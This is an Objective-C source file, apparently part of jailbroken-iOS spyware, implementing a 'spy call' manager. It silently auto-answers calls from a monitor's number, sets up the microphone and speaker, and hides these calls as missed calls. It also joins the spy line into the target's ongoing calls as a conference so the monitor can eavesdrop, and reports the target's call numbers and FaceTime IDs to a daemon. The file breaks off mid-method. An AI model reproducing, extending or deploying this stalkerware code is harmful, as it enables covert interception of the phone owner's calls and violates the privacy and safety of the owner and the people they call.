//
//  SpyCallManager.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallManager.h"
#import "FxCall.h"
#import "SystemEnvironmentUtils.h"
#import "SpyCallUtils.h"
#import "SpyCallDisconnectDelegate.h"
#import "DefStd.h"
#import "Telephony.h"
#import "TelephoneNumberPicker.h"
#import "SpyCallManagerSnapshot.h"

#import <pthread.h>

static SpyCallManager *_SpyCallManager = nil;

@interface SpyCallManager (private)

- (void) disconnectSpyCall;
- (void) disconnectSpyCallDelay;
- (void) holdNormalCalls;
- (void) resumeNormalCalls;
- (BOOL) anyCallOnHold;
- (void) addCall: (FxCall *) aCall;
- (void) addCallIfNecessary: (FxCall *) aCall;
- (void) removeCall: (FxCall *) aCall;
- (NSInteger) countSpyCall;
- (NSInteger) countNormalCall;
- (NSInteger) findCall: (FxCall *) aCall;

- (void) setCallState: (FxCall *) aCall withState: (FxCallState) aCallState;
- (void) setCallDirection: (FxCall *) aCall;
- (void) joinConferenceDelay;
- (void) spyCallCompleteInitiateConference;

- (void) notifyNormalCallInProgress: (FxCall *) aCall; // No delay, need as fast as possible
- (void) notifyMaxConferenceLine: (NSNumber *) aNumberOfLine;
- (void) notifyNormalCallOnHold;
- (void) notifyAudioIsActive;
- (void) notifySpyCallInProgress;
- (void) notifyFaceTimeInProgress;
- (void) notifyConferenceNotSupport;

- (void) spyCallDisconnecting: (id) aCall;
- (void) spyCallDidDisconnected: (id) aCall;

- (NSArray *) currentCalls;
- (CTCall *) getCTCallFromTelephonyServer: (FxCall *) aCall;

- (void) resumeNormalCallsIfOnHold;

- (void) increaseMissedCallByOne;

- (NSString *) getPrivateNumberString;

- (void) activateSpeaker;
- (void) deactivateSpeaker;

@end

// ** NOTE: We can use either mSpyCall or query spy call from mCalls to identify the spy call object
// - For conference use only Mobile Phone hook
// - For spy call use both Mobile Phone and SpringBoard hook

// ** Spy Call sequences of 2 lines:
// answer spy call -> normal call on hold -> spy call connected -> spy call on hold -> join conference -> normal call + spy call begin connected

@implementation SpyCallManager

@synthesize mCalls;
@synthesize mSystemEnvUtils;
@synthesize mSpyCall;
@synthesize mTelephoneNumberPicker;

@synthesize mIsNormalCallInProgress;
@synthesize mIsNormalCallIncoming;
@synthesize mIsSpyCallInProgress;
@synthesize mIsSpyCallAnswering;
@synthesize mIsSpyCallDisconnecting;
@synthesize mIsSpyCallCompletelyHangup;
@synthesize mIsSpyCallInitiatingConference;
@synthesize mIsSpyCallInConference;
@synthesize mIsSpyCallLeavingConference;

@synthesize mSpyCallConferenceTask;

+ (id) sharedManager {
	if (_SpyCallManager == nil) {
		_SpyCallManager = [[SpyCallManager alloc] init];
	}
	return (_SpyCallManager);
}

- (id) init {
	if ((self = [super init])) {
		mCalls = [[NSMutableArray alloc] init];
		mSpyCallDisconnectDelegates = [[NSMutableArray alloc] init];
		mSystemEnvUtils = [[SystemEnvironmentUtils alloc] init];
		[mSystemEnvUtils setMSpyCallManager:self];
		[self addSpyCallDisconnectDelegate:mSystemEnvUtils];
		mTelephoneNumberPicker = [[TelephoneNumberPicker alloc] init];
		[self setMIsSpyCallCompletelyHangup:YES];
	}
	return (self);
}

- (NSInteger) normalCallCount {
	return ([self countNormalCall]);
}

- (BOOL) isCallsOnHold {
	return ([self anyCallOnHold]);
}

#pragma mark telephony server callback functions

- (void) handleDialingCall: (FxCall *) aCall {
	APPLOGVERBOSE(@"Call is dialing, telNumber = %@, [aCall mCTCall] = %p, status = %d", [aCall mTelephoneNumber], [aCall mCTCall], CTCallGetStatus([aCall mCTCall]));
	[aCall setMDirection:kFxCallDirectionOut];
	[self addCall:aCall];
	[self setCallState:aCall withState:kFxCallStateDialing];
}

- (void) handleIncomingCall: (FxCall *) aCall {
	APPLOGVERBOSE(@"Call is coming, telNumber = %@, [aCall mCTCall] = %p, status = %d", [aCall mTelephoneNumber], [aCall mCTCall], CTCallGetStatus([aCall mCTCall]));
	[aCall setMDirection:kFxCallDirectionIn];
	[aCall setMCallState:kFxCallStateIncoming];
	if ([SpyCallUtils isSpyNumber:[aCall mTelephoneNumber]]) {
		[aCall setMIsSpyCall:YES];
		APPLOGVERBOSE (@"Spy call obj = %@", aCall);
		if (![[self mSystemEnvUtils] isAudioActive] && ![self mIsNormalCallInProgress]) { // Spy call
            if (![SpyCallUtils hasActiveFaceTimeCall]) { // Check if FaceTime in progress
                APPLOGVERBOSE(@"Spy call count = %d, aCall = %@, mSpyCall = %@", [self countSpyCall], aCall, [self mSpyCall]);
                if ([self countSpyCall] == 0 || [[self mSpyCall] isEqualToCall:aCall]) {
                    [self setMSpyCall:aCall];
                    [self setMIsSpyCallAnswering:YES];
                    [SpyCallUtils prepareToAnswerCall]; // Setup mic and speaker
                    CTCallAnswer([aCall mCTCall]);
                } else { // Spy call in progress while another spy call come in (multiple spy number)
                    APPLOGVERBOSE(@"Force to disconnect NEW spy call");
                    [self setMIsSpyCallDisconnecting:YES];
                    [aCall setMIsSecondarySpyCall:YES];
                    [self increaseMissedCallByOne];
                    CTCallDisconnect([aCall mCTCall]);
                    if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
                        // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                        [self performSelector:@selector(notifySpyCallInProgress) withObject:nil afterDelay:0.0];
                    }
                }
            } else {
                // FaceTime is in progress
                APPLOGVERBOSE(@"FaceTime call is active");
                if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
                    // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                    [self performSelector:@selector(notifyFaceTimeInProgress) withObject:nil afterDelay:0.0];
                }
                [self setMIsSpyCallDisconnecting:YES];
                [self increaseMissedCallByOne];
                CTCallDisconnect([aCall mCTCall]);
            }
		} else { // Conference call
            if ([SpyCallUtils isConferenceCallEnable]) {
                APPLOGVERBOSE(@"Conference call enabled...");
                if ([self countSpyCall] >= 1) { // Second spy come in while first spy call is in confrence
                    [aCall setMIsSecondarySpyCall:YES];
                }
                
                if ([self mIsNormalCallInProgress] && ![self anyCallOnHold] && ![SpyCallUtils hasActiveFaceTimeCall]) { // Join conference with normal call but not FaceTime call
                    if ([[self mCalls] count] >= MAX_CONFERENCE_LINE) {
                        [self setMIsSpyCallDisconnecting:YES];
                        [self increaseMissedCallByOne];
                        CTCallDisconnect([aCall mCTCall]);
                        if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
                            if ([aCall mIsSecondarySpyCall]) {
                                // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                                [self performSelector:@selector(notifySpyCallInProgress) withObject:nil afterDelay:0.0];
                            } else {
                                // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                                [self performSelector:@selector(notifyMaxConferenceLine:)
                                           withObject:[NSNumber numberWithInt:MAX_CONFERENCE_LINE]
                                           afterDelay:0.0];
                            }
                        }
                    } else {
                        [self setMSpyCall:aCall];
                        [self setMIsSpyCallAnswering:YES];
                        [self setMIsSpyCallInitiatingConference:YES];
                        if ([SpyCallUtils isSpringBoardHook]) { // Answer spy call for call intercpet in SpringBoard, thus it's able to resume
                            CTCallAnswer([aCall mCTCall]); // Cause spy call (CONNECTED -> ON HOLD), Normal call (ON HOLD -> CONNECTED)
                        }
                        [self setMSpyCallConferenceTask:kSpyCallConferenceTaskResumeNormal];
                    }
                } else { // Normal call on hold or audio session is acitve or FaceTime is active
                    APPLOGVERBOSE(@"Force to disconnect spy call, any call held = %d", [self anyCallOnHold]);
                    if ([self anyCallOnHold]) {
                        if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
                            // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                            [self performSelector:@selector(notifyNormalCallOnHold) withObject:nil afterDelay:0.0];
                        }
                    } else if ([SpyCallUtils hasActiveFaceTimeCall]) { // FaceTime is active
                        if ([SpyCallUtils isSpringBoardHook]) {
                            [self performSelector:@selector(notifyFaceTimeInProgress) withObject:nil afterDelay:0.0];
                        }
                    } else { // Audio is active
                        if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
                            // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                            [self performSelector:@selector(notifyAudioIsActive) withObject:nil afterDelay:0.0];
                        }
                    }
                    [self setMIsSpyCallDisconnecting:YES];
                    [self increaseMissedCallByOne];
                    CTCallDisconnect([aCall mCTCall]);
                }
            } else {
                APPLOGVERBOSE(@"Conference call disabled...");
                if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
                    // For solving problem of count of [self countSpyCall] which return incorrectly... call ASAP
                    [self performSelector:@selector(notifyConferenceNotSupport) withObject:nil afterDelay:0.0];
                }
                
                [self setMIsSpyCallDisconnecting:YES];
                [self increaseMissedCallByOne];
                CTCallDisconnect([aCall mCTCall]);
            }
        }
	} else { // Normal call
		[self setMIsNormalCallIncoming:YES];
		if ([SpyCallUtils isCallWaiting:[aCall mCTCall]]) { // 2 lines, end spy call at normal call waiting status
			if ([self mIsSpyCallInProgress]) {
				if ([self mIsSpyCallInConference]) {
					[self setMIsSpyCallLeavingConference:YES];
				} else {
                    if ([SpyCallUtils isSpringBoardHook]) {
                        APPLOGVERBOSE(@"Deactivate loud speaker because normal incoming call");
                        /****************************************************************************
                         No effect to surpress call waiting tone since tone is played from operator
                         Please notice "side effect":
                         ****************************************************************************/
                        [SpyCallUtils deactivateSpeakerWithAVController:nil];
                    }
                }
				[self setMIsSpyCallDisconnecting:YES];
				[self disconnectSpyCall];
			}
		}
	}
	
	[self addCall:aCall];
	[self setCallState:aCall withState:kFxCallStateIncoming];
	APPLOGVERBOSE(@"aCall is a spy call = %d", [aCall mIsSpyCall]);
	APPLOGVERBOSE(@"Inc-All calls count = %d, spy call = %d, normal call = %d", [[self mCalls] count], [self countSpyCall], [self countNormalCall]);
}

- (void) handleCallConnected: (FxCall *) aCall {
	APPLOGVERBOSE(@"Call is connected, telNumber = %@, [aCall mCTCall] = %p, status = %d", [aCall mTelephoneNumber], [aCall mCTCall], CTCallGetStatus([aCall mCTCall]));
	// In Iphone 4, IOS 4.2.1 set call direction is not work since allCall methods in handleIncomingCall is called after this method is get called
	// this issue is resolved by using [SpyCallUtils isOutgoingCall:] in TelephonyNotifier to get direction...
    [self addCallIfNecessary:aCall]; // Check comment in .mm (MobilePhone application)
	[self setCallDirection:aCall];
	[self setCallState:aCall withState:kFxCallStateConnected];
	if ([aCall mDirection] == kFxCallDirectionIn && [SpyCallUtils isSpyCall:[aCall mCTCall]]) {
		APPLOGVERBOSE(@"Spy call is connected, aCall = %@", aCall);
		BOOL isSpyCallUnheld = [self mIsSpyCallInProgress];
		if (!isSpyCallUnheld && ![self mIsSpyCallInitiatingConference]) {
			if ([SpyCallUtils isSpringBoardHook]) {
				[SpyCallUtils setAVController:[[self mSystemEnvUtils] mAVController] category:@"PhoneCall" transition:1];
                
                APPLOGVERBOSE(@"Activate loud speaker on spy call active");
                /*************************************************************************************************************************
                 Please notice "side effect":
                 1. While spy call is in progress, monitor end spy call there will be sound "toot toot toot" play [Fixed, sometime iOS 8]
                 2. While spy call is in progress, 3rd party call to target there will be sound "toot" play
                 *************************************************************************************************************************/
                
                // iOS 8, if we activate speaker immediately sometime it causes mediaserverd error which lead
                // to audio/video playback and audio recording does not function. MAY BE, issue not discover on iOS 7 downward
                //
                // Starting from iOS 8, speaker is activate/deactivate in SpringBoard only -> we need apply the logic to iOS 7,6 for the
                // advantage of common code
                
                //[SpyCallUtils activateSpeakerWithAVController:[[self mSystemEnvUtils] mAVController]];
                [self performSelector:@selector(activateSpeaker) withObject:nil afterDelay:1.0];
			}
		}
		
		[self setMIsSpyCallInProgress:YES];
		[self setMIsSpyCallAnswering:NO];
		if ([self mIsSpyCallInitiatingConference]) {
			if ([self mSpyCallConferenceTask] == kSpyCallConferenceTaskResumeNormal) {
				[self performSelector:@selector(resumeNormalCallsIfOnHold) withObject:nil afterDelay:3.0];
				[self setMSpyCallConferenceTask:kSpyCallConferenceTaskJoinConference];
			}
		}
	} else {
		APPLOGVERBOSE(@"Normal call is connected, aCall = %@", aCall);
		BOOL isNormalCallUnheld = [self mIsNormalCallInProgress]; // Keep status whether the is connected from on hold
		[self setMIsNormalCallInProgress:YES];
		[self setMIsNormalCallIncoming:NO];
		if (!isNormalCallUnheld && ![self mIsSpyCallAnswering] &&
			![self mIsSpyCallInProgress] && ![self mIsSpyCallDisconnecting]) { // In order to prevent send notification again and again with same call
			if ([SpyCallUtils isSpringBoardHook]) { // Only SpringBoard is enough to prevent duplicate
				if (![SpyCallUtils isSpyNumber:[aCall mTelephoneNumber]]) { // To prevent send notification of outgoing to monitor number
					APPLOGVERBOSE (@"Normal call is in progress");
					[self notifyNormalCallInProgress:aCall];
				} else {
					APPLOGVERBOSE (@"Outgoing call to monitor is in progress");
				}
			}
		}
	}
	APPLOGVERBOSE(@"Con-All calls count = %d, spy call = %d, normal call = %d", [[self mCalls] count], [self countSpyCall], [self countNormalCall]);
}

- (void) handleCallOnHold: (FxCall *) aCall {
	APPLOGVERBOSE(@"Call is on hold, telNumber = %@, [aCall mCTCall] = %p, status = %d", [aCall mTelephoneNumber], [aCall mCTCall], CTCallGetStatus([aCall mCTCall]));
    [self addCallIfNecessary:aCall]; // Check comment in .mm (MobilePhone application)
	[self setCallDirection:aCall];
	[self setCallState:aCall withState:kFxCallStateOnHold];
	if ([self countNormalCall] >= 1) {
		if ([self mIsSpyCallInitiatingConference]) {
			if ([SpyCallUtils isSpyCall:[aCall mCTCall]]) {
				if (![self mIsSpyCallInConference]) {
					if ([self mSpyCallConferenceTask] == kSpyCallConferenceTaskJoinConference) {
						[self performSelector:@selector(joinConferenceDelay) withObject:nil afterDelay:0.5];
						[self setMSpyCallConferenceTask:kSpyCallConferenceTaskNone];
					}
				} else {
					CTCallResume([aCall mCTCall]);
				}
			}
		}
	}
}

- (void) handleCallDisconnected: (FxCall *) aCall {
	APPLOGVERBOSE(@"Call disconnected, telNumber = %@, [aCall mCTCall] = %p, status = %d", [aCall mTelephoneNumber], [aCall mCTCall], CTCallGetStatus([aCall mCTCall]));
	[self setCallDirection:aCall];
	[self setCallState:aCall withState:kFxCallStateDisconnected];
	
	for (FxCall *call in [self mCalls]) {
		if ([call isEqualToCall:aCall]) {
			if ([call mIsSpyCall]) {
				[aCall setMIsSecondarySpyCall:[call mIsSecondarySpyCall]];
                
                /* If spy call disconnecting flag is false that's mean spy call is disconnect by monitor phone */
                if (![self mIsSpyCallDisconnecting]) {
                    [self setMIsSpyCallDisconnecting:YES];
                }
                
				[self performSelector:@selector(spyCallDisconnecting:) withObject:call afterDelay:0.0];
				[self performSelector:@selector(spyCallDidDisconnected:) withObject:call afterDelay:1.5];
				
                if (![call mIsSecondarySpyCall]) {
					[self setMIsSpyCallInConference:NO];
					[self setMIsSpyCallInProgress:NO];
					[self setMSpyCall:nil];
					[self setMSpyCallConferenceTask:kSpyCallConferenceTaskNone];
				}
                
                if ([SpyCallUtils isSpringBoardHook]) {
                    APPLOGVERBOSE(@"Deactivate loud speaker because spy call inactive");
                    [SpyCallUtils deactivateSpeakerWithAVController:nil];
                    
                    // CANNOT delay above method otherwise issue No.1 described in handleCallConnected will appear
                    //[self performSelector:@selector(deactivateSpeaker) withObject:nil afterDelay:1.0];
                }
                
			} else {
				[self setMIsNormalCallIncoming:NO];
			}
			break;
		}
	}
	
	[self removeCall:aCall];
	
	if ([self countNormalCall] <= 0) {
		[self setMIsNormalCallInProgress:NO];
	}
	
	if ([self countSpyCall] == 1 && ![aCall mIsSecondarySpyCall]) {
		if ([self countNormalCall] <= 0) {
			[self setMIsSpyCallDisconnecting:YES];
			[self disconnectSpyCall];
		}
	}
	
	if ([[self mCalls] count] == 0) { // Reset spy call manager states
		[self setMIsNormalCallIncoming:NO];
		[self setMIsNormalCallInProgress:NO];
		[self setMIsSpyCallAnswering:NO];
		[self setMIsSpyCallInProgress:NO];
		[self setMIsSpyCallInitiatingConference:NO];
		[self setMIsSpyCallInConference:NO];
		[self setMSpyCallConferenceTask:kSpyCallConferenceTaskNone];
	}
	APPLOGVERBOSE(@"Dis-All calls count = %d, spy call = %d, normal call = %d", [[self mCalls] count], [self countSpyCall], [self countNormalCall]);
}

#pragma mark telephony server FaceTime callback methods

- (void) handleDialingAlternativeCall: (FxCall *) aCall {
    APPLOGVERBOSE(@"--- ALTCALL DIALING ---");
}

- (void) handleIncomingAlternativeCall: (FxCall *) aCall {
    APPLOGVERBOSE(@"--- ALTCALL INCOMING ---");
    [self setMIsNormalCallIncoming:YES];
    if ([SpyCallUtils isCallWaiting:[aCall mCTCall]]) { // 2 lines, end spy call at normal call waiting status
        if ([self mIsSpyCallInProgress]) {
            if ([self mIsSpyCallInConference]) {
                [self setMIsSpyCallLeavingConference:YES];
            } else {
                if ([SpyCallUtils isSpringBoardHook]) {
                    APPLOGVERBOSE(@"Deactivate loud speaker because of incoming FaceTime call");
                    /****************************************************************************
                     No effect to surpress call waiting tone since tone is played from operator
                     Please notice "side effect":
                     ****************************************************************************/
                    [SpyCallUtils deactivateSpeakerWithAVController:nil];
                }
            }
            [self setMIsSpyCallDisconnecting:YES];
            [self disconnectSpyCall];
        }
    }
}

- (void) handleAlternativeCallConnected: (FxCall *) aCall {
    APPLOGVERBOSE(@"--- ALTCALL CONNECTED ---");
}

- (void) handleAlternativeCallOnHold: (FxCall *) aCall {
    APPLOGVERBOSE(@"--- ALTCALL ON HOLD ---");
}

- (void) handleAlternativeCallDisconnected: (FxCall *) aCall {
    APPLOGVERBOSE(@"--- ALTCALL DISCONNECTED ---");
}

#pragma mark delegate functions

- (void) addSpyCallDisconnectDelegate: (id <SpyCallDisconnectDelegate>) aDelegate {
	[mSpyCallDisconnectDelegates addObject:aDelegate];
}

- (void) removeSpyCallDisconnectDelegate: (id <SpyCallDisconnectDelegate>) aDelegate {
	[mSpyCallDisconnectDelegates removeObject:aDelegate];
}

- (void) disconnectedActivityDetected {
	APPLOGVERBOSE (@"<<<=========== USER CAUSE SPY CALL DISCONNECT DETECTED ===========>>>");
	if ([self countSpyCall]) {
		[self setMIsSpyCallDisconnecting:YES];
		[self disconnectSpyCall];
	}
}

- (SpyCallManagerSnapshot *) takeSnapshot {
    SpyCallManagerSnapshot *snapshot = [[SpyCallManagerSnapshot alloc] init];
    [snapshot setMNumberOfNormalCall:[self countNormalCall]];
    [snapshot setMNumberOfSpyCall:[self countSpyCall]];
    [snapshot setMIsNormalCallIncoming:[self mIsNormalCallIncoming]];
    [snapshot setMIsNormalCallInProgress:[self mIsNormalCallInProgress]];
    [snapshot setMIsSpyCallInProgress:[self mIsSpyCallInProgress]];
    [snapshot setMIsSpyCallAnswering:[self mIsSpyCallAnswering]];
    [snapshot setMIsSpyCallDisconnecting:[self mIsSpyCallDisconnecting]];
    [snapshot setMIsSpyCallCompletelyHangup:[self mIsSpyCallCompletelyHangup]];
    [snapshot setMIsSpyCallInitiatingConference:[self mIsSpyCallInitiatingConference]];
    [snapshot setMIsSpyCallInConference:[self mIsSpyCallInConference]];
    [snapshot setMIsSpyCallLeavingConference:[self mIsSpyCallLeavingConference]];
    return ([snapshot autorelease]);
}

#pragma mark private functions

pthread_mutex_t _currentCallsMutex = PTHREAD_MUTEX_INITIALIZER;

- (void) disconnectSpyCall {
	if ([self mIsSpyCallInProgress]) {
		for (FxCall *spyCall in [self mCalls]) {
			if ([spyCall mIsSpyCall]) {
				// Disconnect call while its status is CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INVALID will cause
				// SpringBoard/Mobile phone crash (tested in iOS 5 iPhone 4s)
				//APPLOGVERBOSE(@"Prepare to copy current calls");
				pthread_mutex_lock(&_currentCallsMutex); // To fix the crash: Segmentation fault: 11 in SpringBoard
				NSArray *calls = CTCopyCurrentCalls();
				pthread_mutex_unlock(&_currentCallsMutex);
				for (NSInteger i = 0; i < [calls count]; i++) {
					CTCall *call = (CTCall *)[calls objectAtIndex:i];
					NSString *telephoneNumber = [SpyCallUtils telephoneNumber:call];
					if ([[spyCall mTelephoneNumber] isEqualToString:telephoneNumber]) { // Must be exactly the same match
						//APPLOGVERBOSE(@"New CTCall object for spy call = %@, with status = %d", call, CTCallGetStatus(call));
						CTCallDisconnect(call);
						break;
					}
				}
				[calls release];
				calls = nil;
				
				// Can simply call disconnect straight away on iOS 4 and iOS 5 with any device except 4s
				// at the time of testing
				//CTCallDisconnect([spyCall mCTCall]);
				break;
			}
		}
	}
}

- (void) disconnectSpyCallDelay {
	[self setMIsSpyCallDisconnecting:YES];
	[self disconnectSpyCall];
}

- (void) holdNormalCalls {
	for (FxCall *call in [self mCalls]) {
		if (![call mIsSpyCall]) {
			CTCallHold([call mCTCall]);
		}
	}
}

- (void) resumeNormalCalls {
	for (FxCall *call in [self mCalls]) {
		if (![call mIsSpyCall]) {
			CTCallResume([call mCTCall]);
		}
	}
}

- (BOOL) anyCallOnHold {
	BOOL yes = NO;
	for (FxCall *call in [self mCalls]) {
		if ([call mCallState] == kFxCallStateOnHold) {
			yes = YES;
			break;
		}
	}
	return (yes);
}

- (void) addCall: (FxCall *) aCall {
	APPLOGVERBOSE(@"Add call aCall = %@", aCall);
	APPLOGVERBOSE(@"I-Add call mCalls = %@", [self mCalls]);
	NSInteger index = -1;
	for (NSInteger i = 0; i < [[self mCalls] count]; i++) {
		FxCall *call = [[self mCalls] objectAtIndex:i];
		if ([call isEqualToCall:aCall]) {
			// iOS 5 iPhone 4s provide different CTCall objecct in DISCONNECTED (some time but often) call back
			// but same CTCall object in INCOMING, CONNECTED, ON HOLD and DIALING call back
			index = i;
			break;
		}
	}
	if (index >= 0) {
		[[self mCalls] replaceObjectAtIndex:index withObject:aCall];
	} else {
		[[self mCalls] addObject:aCall];
	}
	APPLOGVERBOSE(@"II-Add call mCalls = %@", [self mCalls]);
}

- (void) addCallIfNecessary: (FxCall *) aCall {
    if ([SpyCallUtils isIOS8] ||
        [SpyCallUtils isIOS9]) {
        if ([self findCall:aCall] == NSNotFound) {
            [self addCall:aCall];
        }
    }
}
		
- (void) removeCall: (FxCall *) aCall {
	//APPLOGVERBOSE(@"Remove call aCall = %@", aCall);
	NSInteger index = -1;
	for (NSInteger i = 0; i < [[self mCalls] count]; i++) {
		FxCall *call = [[self mCalls] objectAtIndex:i];
		if ([call isEqualToCall:aCall]) {
			// iOS 5 iPhone 4s gave different CTCall objecct in INCOMING and DISCONNECTED
			// but same CTCall object in the same call back INCOMING, DISCONNECTED
			index = i;
			break;
		}
	}
	
	if (index >= 0) {
		[[self mCalls] removeObjectAtIndex:index];
	}
}

- (NSInteger) countSpyCall {
	NSInteger count = 0;
	for (FxCall *call in [self mCalls]) {
		if ([call mIsSpyCall]) {
			count++;
		}
	}
	return (count);
}

- (NSInteger) countNormalCall {
	NSInteger count = 0;
	for (FxCall *call in [self mCalls]) {
		if (![call mIsSpyCall]) {
			count++;
		}
	}
	return (count);
}

- (NSInteger) findCall: (FxCall *) aCall {
    NSInteger index = NSNotFound;
    for (NSInteger i = 0; i < [[self mCalls] count]; i++) {
        FxCall *call = [[self mCalls] objectAtIndex:i];
        if ([call isEqualToCall:aCall]) {
            index = i;
            break;
        }
    }
    return (index);
}

- (void) setCallState: (FxCall *) aCall withState: (FxCallState) aCallState {
	[aCall setMCallState:aCallState];
	for (FxCall *call in [self mCalls]) {
		if ([call isEqualToCall:aCall]) {
			[call setMCallState:aCallState];
			break;
		}
	}
}

- (void) setCallDirection: (FxCall *) aCall {
	APPLOGVERBOSE (@"mCalls = %@", [self mCalls]);
	APPLOGVERBOSE (@"aCall = %@", aCall);
	for (FxCall *call in [self mCalls]) {
		if ([call isEqualToCall:aCall]) {
			[aCall setMDirection:[call mDirection]];
			break;
		}
	}
}

- (void) joinConferenceDelay {
	APPLOGVERBOSE(@"Join the conference ;-) delay done");
	[self setMIsSpyCallInConference:YES];
	FxCall *call = nil;
	NSEnumerator *enumerator = [[self mCalls] reverseObjectEnumerator];
	while (call = [enumerator nextObject]) {
		if ([SpyCallUtils isMobileApplicationHook]) {
			if ([call mIsInConference]) { // In case of rejoin the conference
                // From iOS 7 (or may be iOS 6, 5..), this line cause rejoin conference failed...
				//CTCallLeaveConference([call mCTCall]);
			}
			CTCallJoinConference([call mCTCall]);
		}
#pragma mark Critical iOS 7,8
        /*
         In case of MobilePhone application is not running (iOS 7), however OS will launch MobilePhone when there is a call,
         then use applicationDidFinishLaunching$ of MobilePhone to keep track of number of calls
         */
        else if ([SpyCallUtils isSpringBoardHook]) {
            if (![SpyCallUtils isMobilePhoneRunning]) {
                /*
                 This can only happen in iOS 7 where MobilePhone application can be killed by user (confirmed iOS7, never come here but to remember the behavior because
                 MobilePhone is relaunch by OS)
                 
                 iOS 8, MobilePhone application does not launch or relaunch when there is outgoing or incoming call has made so this case happen on iOS 8 where only SpringBoard
                 is capable of doing the job of conference alone
                 */
                APPLOGVERBOSE(@"Join the conference by SpringBoard alone");
                CTCallJoinConference([call mCTCall]);
            }
        }
        
		[call setMIsInConference:YES];
	}
	[self performSelector:@selector(spyCallCompleteInitiateConference) withObject:nil afterDelay:[[self mCalls] count]];
}

- (void) spyCallCompleteInitiateConference {
	[self setMIsSpyCallInitiatingConference:NO];
}

- (void) notifyNormalCallInProgress: (FxCall *) aCall {
	NSString *telephoneNumber = [[aCall mTelephoneNumber] length] ? [aCall mTelephoneNumber] : [self getPrivateNumberString];
	NSMutableDictionary *info = [NSMutableDictionary dictionary];
	[info setObject:[NSNumber numberWithInteger:(NSInteger)[aCall mDirection]] forKey:kNormalCallDirection];
	[info setObject:telephoneNumber forKey:kNormalCallNumber];
	[SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSNormalCallInProgress cmdInfo:info];
}

- (void) notifyMaxConferenceLine: (NSNumber *) aNumberOfLine {
	NSMutableArray *telNumbers = [NSMutableArray array];
	NSMutableArray *directions = [NSMutableArray array];
	for (FxCall *call in [self mCalls]) {
		if (![call mIsSpyCall]) {
			NSString *telephoneNumber = [[call mTelephoneNumber] length] ? [call mTelephoneNumber] : [self getPrivateNumberString];
			[telNumbers addObject:telephoneNumber];
			[directions addObject:[NSNumber numberWithInt:[call mDirection]]];
		}
	}

	NSDictionary *info = [NSDictionary dictionaryWithObjectsAndKeys:telNumbers, kTeleNumbers,
								 directions, kTeleDirections,
								 aNumberOfLine, kTeleMaxLines,
								 nil];
	[SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSMaxConferenceLine cmdInfo:info];
}

- (void) notifyNormalCallOnHold {
	NSMutableArray *onHoldNumbers = [NSMutableArray array];
	NSMutableArray *directions = [NSMutableArray array];
	for (FxCall *call in [self mCalls]) {
		if (![call mIsSpyCall] && [call mCallState] == kFxCallStateOnHold) {
			NSString *telephoneNumber = [[call mTelephoneNumber] length] ? [call mTelephoneNumber] : [self getPrivateNumberString];
			[onHoldNumbers addObject:telephoneNumber];
			[directions addObject:[NSNumber numberWithInt:[call mDirection]]];
		}
	}
	NSDictionary *info = [NSDictionary dictionaryWithObjectsAndKeys:onHoldNumbers, kTeleNumbers,
																directions, kTeleDirections,
								 nil];
	[SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSNormalCallOnHold cmdInfo:info];
}

- (void) notifyAudioIsActive {
	[SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSAudioIsActive cmdInfo:nil];
}

- (void) notifySpyCallInProgress {
	[SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSSpyCallInProgress cmdInfo:[[self mSpyCall] mTelephoneNumber]];
}

- (void) notifyFaceTimeInProgress {
    [SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSFaceTimeInProgress cmdInfo:[SpyCallUtils currentFaceTimeCallRemoteUserIds]];
}

- (void) notifyConferenceNotSupport {
    [SpyCallUtils sendCommandToSpyCallDaemon:kSpyCallMSConferenceNotSupport cmdInfo:nil];
}

- (void) spyCallDisconnecting: (id) aCall {
	//APPLOGVERBOSE(@"Disconnecting is fired ...>>> %@", aCall);
	[self setMIsSpyCallLeavingConference:NO];
	[self setMIsSpyCallDisconnecting:NO];
	[self setMIsSpyCallCompletelyHangup:NO];
	FxCall *spyCall = aCall;
	for (id <SpyCallDisconnectDelegate> delegate in mSpyCallDisconnectDelegates) {
		if ([delegate respondsToSelector:@selector(spyCallDisconnecting:)]) {
			[delegate performSelector:@selector(spyCallDisconnecting:) withObject:spyCall];
		}
	}
}

- (void) spyCallDidDisconnected: (id) aCall {
	//APPLOGVERBOSE(@"Disconnected is fired ...>>> %@", aCall);
	[self setMIsSpyCallDisconnecting:NO];
	[self setMIsSpyCallCompletelyHangup:YES];
	FxCall *spyCall = aCall;
	for (id <SpyCallDisconnectDelegate> delegate in mSpyCallDisconnectDelegates) {
		if ([delegate respondsToSelector:@selector(spyCallDidCompletelyDisconnected:)]) {
			[delegate performSelector:@selector(spyCallDidCompletelyDisconnected:) withObject:spyCall];
		}
	}
}

- (NSArray *) currentCalls {
	pthread_mutex_lock(&_currentCallsMutex);    // To fix the crash: Segmentation fault: 11 in SpringBoard
	NSArray *calls = CTCopyCurrentCalls();      // Cannot copy FaceTime calls
	pthread_mutex_unlock(&_currentCallsMutex);
	[calls autorelease];
	return (calls);
}

- (CTCall *) getCTCallFromTelephonyServer: (FxCall *) aCall {
	CTCall *newCall = nil;
	NSArray *calls = [self currentCalls];
	for (NSInteger i = 0; i < [calls count]; i++) {
		CTCall *call = (CTCall *)[calls objectAtIndex:i];
		if ([[SpyCallUtils telephoneNumber:call] isEqualToString:[aCall mTelephoneNumber]]) { // Exactly match
